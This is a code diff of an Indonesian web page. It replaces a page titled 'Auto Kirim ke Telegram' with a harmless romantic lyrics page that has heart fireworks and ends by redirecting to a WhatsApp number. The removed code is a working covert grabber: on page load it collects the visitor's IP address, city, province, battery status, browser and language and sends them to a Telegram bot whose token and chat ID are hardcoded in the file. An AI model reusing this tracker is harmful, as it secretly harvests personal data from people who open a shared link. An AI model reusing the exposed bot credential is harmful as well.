@@ -1,71 +1,328 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Kirim ke Telegram</title>
+ <meta charset="UTF-8">
+ <title>Bucin Mode - Kangen Band</title>
+ <style>
+   body {
+     font-family: 'Poppins', sans-serif;
+     margin: 0;
+     overflow: hidden;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     height: 100vh;
+     background: linear-gradient(-45deg, #ff9a9e, #fad0c4, #a18cd1, #fbc2eb);
+     background-size: 400% 400%;
+     animation: gradientBG 10s ease infinite;
+     transition: filter 0.3s;
+   }
+
+   @keyframes gradientBG {
+     0% { background-position: 0% 50%; }
+     50% { background-position: 100% 50%; }
+     100% { background-position: 0% 50%; }
+   }
+
+   .container {
+     background: rgba(255, 255, 255, 0.15);
+     backdrop-filter: blur(15px);
+     border-radius: 20px;
+     padding: 30px;
+     max-width: 500px;
+     width: 90%;
+     text-align: center;
+     box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+     animation: fadeIn 1s ease;
+     position: relative;
+     z-index: 2;
+   }
+
+   .judul {
+     font-size: 26px;
+     margin-bottom: 20px;
+     color: #fff;
+     text-shadow: 0 0 15px rgba(233,30,99,0.9);
+     animation: glow 2s infinite alternate;
+   }
+
+   #bait-lirik {
+     font-size: 18px;
+     line-height: 1.6;
+     color: #fff;
+     margin-bottom: 20px;
+     padding: 15px;
+     border-radius: 12px;
+     background: rgba(255,255,255,0.1);
+     box-shadow: inset 0 0 15px rgba(255,255,255,0.2);
+     opacity: 0;
+   }
+
+   .fade-in {
+     animation: fadeInText 1s forwards;
+   }
+
+   @keyframes fadeInText {
+     from { opacity: 0; transform: translateY(20px) scale(0.95); }
+     to   { opacity: 1; transform: translateY(0) scale(1); }
+   }
+
+   @keyframes glow {
+     from { text-shadow: 0 0 10px #ff80ab, 0 0 20px #ff4d6d; }
+     to   { text-shadow: 0 0 20px #f06292, 0 0 30px #e91e63; }
+   }
+
+   button {
+     background: linear-gradient(135deg, #ff4081, #f50057);
+     color: white;
+     border: none;
+     padding: 10px 25px;
+     margin: 5px;
+     border-radius: 30px;
+     font-size: 16px;
+     cursor: pointer;
+     transition: transform 0.2s, box-shadow 0.3s;
+   }
+
+   button:hover {
+     transform: scale(1.1);
+     box-shadow: 0 0 15px rgba(255,64,129,0.8);
+   }
+
+   canvas {
+     position: fixed;
+     top: 0;
+     left: 0;
+     width: 100%;
+     height: 100%;
+     pointer-events: none;
+     z-index: 1;
+   }
+
+   /* Goyang */
+   .shake {
+     animation: shakeAnim 0.5s ease;
+   }
+   @keyframes shakeAnim {
+     0%   { transform: translate(0, 0) rotate(0); }
+     20%  { transform: translate(-12px, 0) rotate(-2deg); }
+     40%  { transform: translate(12px, 0) rotate(2deg); }
+     60%  { transform: translate(-12px, 0) rotate(-2deg); }
+     80%  { transform: translate(12px, 0) rotate(2deg); }
+     100% { transform: translate(0, 0) rotate(0); }
+   }
+
+   /* Heartbeat */
+   .heartbeat {
+     animation: heartbeatAnim 0.8s ease;
+   }
+   @keyframes heartbeatAnim {
+     0%   { transform: scale(1); }
+     25%  { transform: scale(1.1); }
+     50%  { transform: scale(1); }
+     75%  { transform: scale(1.15); }
+     100% { transform: scale(1); }
+   }
+
+   /* Flash BG */
+   .flash-bg {
+     animation: flashAnim 0.6s ease;
+   }
+   @keyframes flashAnim {
+     0%   { filter: brightness(1); }
+     50%  { filter: brightness(1.5); }
+     100% { filter: brightness(1); }
+   }
+ </style>
 </head>
 <body>
+ <canvas id="fireworks"></canvas>
+ <div class="container">
+   <h2 class="judul">💘 From-Inuu 💘</h2>
+   <div class="bait" id="bait-lirik"></div>
+   <button id="nextBtn" onclick="nextBait()">Selanjutnya ➡</button>
+ </div>
 
-    <h>MAKASIH DATA NYA</h2>
+ <script>
+ // Teks bucin
+ const lirik = [
+   {bait: "Bait 1", teks: `
+   Aku rela jadi apa aja<br>
+   Asal bisa deket sama kamu<br>
+   Walau sakit aku tetep bertahan<br>
+   Karena kamu segalanya buatku
+   `},
+   {bait: "Bait 2", teks: `
+   Kamu adalah alasanku bahagia<br>
+   Bahkan sakitmu pun ingin aku rasa<br>
+   Tak peduli dunia menertawakan<br>
+   Aku tetap setia mencintaimu
+   `},
+   {bait: "Bait 3", teks: `
+   Biarlah orang bilang aku gila<br>
+   Biarlah dunia menganggapku lemah<br>
+   Asal kamu tersenyum di depanku<br>
+   Itu sudah cukup buat hatiku bahagia
+   `},
+   {bait: "Bait 4", teks: `
+   aku akan tetap mencitaimu<br>
+   bahkan sampai kau bosan denganku
+   `}, 
+   {bait: "Bait 5", teks: `
+   kuharap hubungan kita tidak pernah renggang<br>
+   kuharap hubungan kita bisa lebih lama dari yang dibayangkan
+   `}, 
+   {bait: "Bait 6", teks: `
+   karena kamu adalah...<br>
+   orang pertama yang mengajarkanku apa itu kasih sayang.<br>
+   aku....
+   `}, 
+   {bait: "Bait 7", teks: `
+   akan selalu...<br>
+   mencintaimu🌹
+   `}
+ ];
+ let i = 0;
 
-    <script>
-        async function getBatteryInfo() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                const status = battery.charging ? "🔌 Mengisi daya" : "⚡ Tidak mengisi daya";
-                return `Baterai: ${Math.round(battery.level * 100)}% (${status})`;
-            }
-            return "Baterai: Tidak didukung";
-        }
+ function nextBait() {
+   if (i < lirik.length - 1) {
+     i++;
+     updateBait();
+     triggerFireworks();
+     if (i === lirik.length - 1) {
+       document.getElementById("nextBtn").innerText = "🌹pencet untuk kembali ke ayang❤";
+     }
+   } else {
+     window.location.href = "wa.me/6283160556330";
+   }
+ }
 
-        async function kirimKeTelegram() {
-            try {
-                const apiUrl = "https://api.db-ip.com/v2/free/self";
-                const response = await fetch(apiUrl);
-                const data = await response.json();
+ function updateBait() {
+   const baitEl = document.getElementById('bait-lirik');
+   baitEl.classList.remove("fade-in");
+   void baitEl.offsetWidth;
+   baitEl.innerHTML = `
+     <p><b>${lirik[i].bait}</b></p>
+     <p>${lirik[i].teks}</p>
+   `;
+   baitEl.classList.add("fade-in");
+ }
+ updateBait();
 
-                const batteryInfo = await getBatteryInfo();
-                const userAgent = navigator.userAgent;
-                const browser = navigator.vendor || "Tidak diketahui";
-                const bahasa = navigator.language;
+ // 🎆 Fireworks Love
+ const canvas = document.getElementById("fireworks");
+ const ctx = canvas.getContext("2d");
+ canvas.width = window.innerWidth;
+ canvas.height = window.innerHeight;
 
-                const pesan = `
-🌍 **Info Pengguna**
-- IP: ${data.ipAddress}
-- Negara: ${data.countryName}
-- Provinsi: ${data.stateProv}
-- Kota: ${data.city}
-- ${batteryInfo}
-- User Agent: ${userAgent}
-- Browser: ${browser}
-- Bahasa: ${bahasa}
-                `;
+ function random(min, max) {
+   return Math.random() * (max - min) + min;
+ }
 
-                const botToken = "8049688021:AAFWp93JwpRYMMVDNVh6qKLVA3UdyHZRJ54"; //
-                const chatId = "7314158034"; // Ganti dengan ID chat lo
+ class Particle {
+   constructor(x, y, color) {
+     this.x = x;
+     this.y = y;
+     this.size = random(8, 16);
+     this.speedX = random(-3, 3);
+     this.speedY = random(-3, 3);
+     this.alpha = 1;
+     this.color = color;
+   }
+   draw() {
+     ctx.globalAlpha = this.alpha;
+     ctx.fillStyle = this.color;
+     ctx.beginPath();
+     ctx.moveTo(this.x, this.y);
+     ctx.bezierCurveTo(this.x - this.size, this.y - this.size,
+                       this.x - this.size, this.y + this.size,
+                       this.x, this.y + this.size * 1.5);
+     ctx.bezierCurveTo(this.x + this.size, this.y + this.size,
+                       this.x + this.size, this.y - this.size,
+                       this.x, this.y);
+     ctx.fill();
+   }
+   update() {
+     this.x += this.speedX;
+     this.y += this.speedY;
+     this.alpha -= 0.02;
+   }
+ }
 
-                const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const telegramResponse = await fetch(telegramApi, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
-                });
+ let particles = [];
+ function triggerFireworks() {
+   const x = random(canvas.width * 0.3, canvas.width * 0.7);
+   const y = random(canvas.height * 0.3, canvas.height * 0.7);
+   const colors = ["#ff4d6d", "#ff80ab", "#e91e63", "#f06292"];
+   for (let i = 0; i < 20; i++) {
+     particles.push(new Particle(x, y, colors[Math.floor(Math.random() * colors.length)]));
+   }
+   playPopSound();
+ }
 
-                if (telegramResponse.ok) {
-                    document.body.innerHTML = "<h2>i track your information!</h2>";
-                } else {
-                    document.body.innerHTML = "<h2>😹.</h2>";
-                }
-            } catch (error) {
-                console.error("Error:", error);
-                document.body.innerHTML = "<h2>Terjadi kesalahan!</h2>";
-            }
-        }
+ function animate() {
+   ctx.clearRect(0, 0, canvas.width, canvas.height);
+   particles.forEach((p, index) => {
+     p.update();
+     p.draw();
+     if (p.alpha <= 0) {
+       particles.splice(index, 1);
+     }
+   });
+   requestAnimationFrame(animate);
+ }
+ animate();
 
-        // Kirim otomatis saat halaman dibuka
-        window.onload = kirimKeTelegram;
-    </script>
+ window.addEventListener("resize", () => {
+   canvas.width = window.innerWidth;
+   canvas.height = window.innerHeight;
+ });
 
+ // 🔊 Pop sound
+ const popSound = new Audio("https://www.myinstants.com/media/sounds/pop-sound-effect.mp3");
+ function playPopSound() {
+   popSound.currentTime = 0;
+   popSound.play();
+ }
+
+ // 📱 Shake detector
+ let lastX = null, lastY = null, lastZ = null;
+ let threshold = 15;
+
+ window.addEventListener("devicemotion", (e) => {
+   let acc = e.accelerationIncludingGravity;
+   if (!acc) return;
+   let { x, y, z } = acc;
+
+   if (lastX !== null && lastY !== null && lastZ !== null) {
+     let deltaX = Math.abs(x - lastX);
+     let deltaY = Math.abs(y - lastY);
+     let deltaZ = Math.abs(z - lastZ);
+
+     if (deltaX + deltaY + deltaZ > threshold) {
+       triggerShake();
+     }
+   }
+
+   lastX = x;
+   lastY = y;
+   lastZ = z;
+ });
+
+ function triggerShake() {
+   const container = document.querySelector(".container");
+   const body = document.body;
+
+   container.classList.add("shake", "heartbeat");
+   body.classList.add("flash-bg");
+
+   triggerFireworks();
+
+   setTimeout(() => {
+     container.classList.remove("shake", "heartbeat");
+     body.classList.remove("flash-bg");
+   }, 800);
+ }
+ </script>
 </body>
 </html>
